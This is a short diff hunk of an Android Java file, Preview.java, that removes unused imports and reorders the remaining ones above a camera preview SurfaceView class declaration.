@@ -1,31 +1,22 @@
 package com.android.deviceinfo.gui;
 
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.List;
-import java.util.concurrent.Callable;
 import java.util.concurrent.TimeUnit;
 
-import com.android.deviceinfo.Status;
-import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.interfaces.SnapshotManager;
-import com.android.deviceinfo.module.ModuleCamera;
-import com.android.deviceinfo.util.Check;
-
 import android.content.Context;
-import android.graphics.Canvas;
-import android.graphics.Color;
-import android.graphics.Paint;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.PreviewCallback;
 import android.hardware.Camera.ShutterCallback;
 import android.hardware.Camera.Size;
 import android.media.AudioManager;
-import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
+
+import com.android.deviceinfo.Status;
+import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.util.Check;
 
 public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 	private static final String TAG = "Preview";
